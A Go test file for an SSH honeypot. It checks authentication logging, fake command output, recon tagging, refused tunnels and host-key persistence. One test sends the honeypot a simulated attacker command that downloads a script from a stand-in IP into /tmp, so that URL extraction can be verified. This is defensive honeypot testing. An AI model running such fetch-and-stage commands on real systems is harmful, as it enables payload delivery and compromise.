package sshpot

import (
	"context"
	"io"
	"log/slog"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/born2feel/honeynet/internal/event"
	"github.com/born2feel/honeynet/internal/netutil"
	"golang.org/x/crypto/ssh"
)

type collector struct {
	mu     sync.Mutex
	events []event.Event
}

func (c *collector) Emit(e event.Event) {
	c.mu.Lock()
	c.events = append(c.events, e)
	c.mu.Unlock()
}

func (c *collector) kinds(k event.Kind) []event.Event {
	c.mu.Lock()
	defer c.mu.Unlock()
	var out []event.Event
	for _, e := range c.events {
		if e.Kind == k {
			out = append(out, e)
		}
	}
	return out
}

// waitFor polls until cond holds: events are emitted from server goroutines.
func waitFor(t *testing.T, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for !cond() {
		if time.Now().After(deadline) {
			t.Fatal("condition not met in time")
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func start(t *testing.T) (string, *collector) {
	t.Helper()
	c := &collector{}
	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	srv, err := New(Config{HostKeyDir: t.TempDir(), Hostname: "srv-test"}, c, netutil.NewLimiter(16, 16), log)
	if err != nil {
		t.Fatal(err)
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	go srv.Serve(ctx, ln)
	return ln.Addr().String(), c
}

func dial(addr, user, pass string) (*ssh.Client, error) {
	return ssh.Dial("tcp", addr, &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		ClientVersion:   "SSH-2.0-Go-test",
		Timeout:         5 * time.Second,
	})
}

func TestRejectsStrongPassword(t *testing.T) {
	addr, c := start(t)
	if _, err := dial(addr, "root", "correct horse battery staple"); err == nil {
		t.Fatal("expected auth failure")
	}
	waitFor(t, func() bool { return len(c.kinds(event.KindDisconnect)) == 1 })
	auths := c.kinds(event.KindAuth)
	if len(auths) == 0 || auths[0].Success || auths[0].Password != "correct horse battery staple" {
		t.Fatalf("auth events: %+v", auths)
	}
	if auths[0].Client != "SSH-2.0-Go-test" {
		t.Errorf("client version not recorded: %q", auths[0].Client)
	}
}

func TestExecAfterWeakPassword(t *testing.T) {
	addr, c := start(t)
	client, err := dial(addr, "root", "123456")
	if err != nil {
		t.Fatal(err)
	}
	defer client.Close()
	sess, err := client.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	out, err := sess.Output("uname -a; whoami")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(out), "Linux srv-test 5.15.0") || !strings.HasSuffix(string(out), "root\n") {
		t.Fatalf("output: %q", out)
	}
	waitFor(t, func() bool { return len(c.kinds(event.KindCommand)) == 1 })
	cmd := c.kinds(event.KindCommand)[0]
	if cmd.Command != "uname -a; whoami" || cmd.SessionID == "" {
		t.Errorf("command event: %+v", cmd)
	}
	if len(cmd.Tags) == 0 || cmd.Tags[0] != "recon" {
		t.Errorf("tags: %v", cmd.Tags)
	}
}

func TestInteractiveShell(t *testing.T) {
	addr, c := start(t)
	client, err := dial(addr, "admin", "admin")
	if err != nil {
		t.Fatal(err)
	}
	defer client.Close()
	sess, err := client.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	if err := sess.RequestPty("xterm", 40, 120, ssh.TerminalModes{}); err != nil {
		t.Fatal(err)
	}
	stdin, _ := sess.StdinPipe()
	stdout, _ := sess.StdoutPipe()
	if err := sess.Shell(); err != nil {
		t.Fatal(err)
	}
	io.WriteString(stdin, "cd /tmp && wget http://203.0.113.5/x.sh\rexit\r")
	out, _ := io.ReadAll(stdout)
	if !strings.Contains(string(out), "Welcome to Ubuntu") || !strings.Contains(string(out), "admin@srv-test:/tmp$") {
		t.Fatalf("transcript: %q", out)
	}
	waitFor(t, func() bool { return len(c.kinds(event.KindCommand)) == 2 })
	dl := c.kinds(event.KindCommand)[0]
	if dl.Detail != "http://203.0.113.5/x.sh" {
		t.Errorf("download URL not extracted: %+v", dl)
	}
}

func TestTunnelAttemptRecorded(t *testing.T) {
	addr, c := start(t)
	client, err := dial(addr, "root", "root")
	if err != nil {
		t.Fatal(err)
	}
	defer client.Close()
	if _, err := client.Dial("tcp", "smtp.example.com:25"); err == nil {
		t.Fatal("port forwarding must be refused")
	}
	waitFor(t, func() bool { return len(c.kinds(event.KindTunnel)) == 1 })
	if d := c.kinds(event.KindTunnel)[0].Detail; d != "smtp.example.com:25" {
		t.Errorf("tunnel target: %q", d)
	}
}

func TestHostKeysPersist(t *testing.T) {
	dir := t.TempDir()
	a, err := loadHostKeys(dir)
	if err != nil {
		t.Fatal(err)
	}
	b, err := loadHostKeys(dir)
	if err != nil {
		t.Fatal(err)
	}
	for i := range a {
		if ssh.FingerprintSHA256(a[i].PublicKey()) != ssh.FingerprintSHA256(b[i].PublicKey()) {
			t.Fatal("host key changed between runs")
		}
	}
}
